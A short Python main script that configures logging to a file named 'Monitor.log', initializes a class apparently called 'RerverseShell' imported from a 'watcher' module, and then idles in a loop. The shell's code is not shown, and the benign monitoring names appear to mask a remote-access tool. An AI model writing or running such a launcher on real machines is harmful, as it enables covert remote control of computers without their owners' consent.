import logging
import time
import platform
from utils.watcher import RerverseShell


if __name__ == "__main__":    
    logging.basicConfig(filename='Monitor.log', level=logging.INFO, format='%(asctime)s - %(message)s')

    RerverseShell().initialize()



    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nExiting...")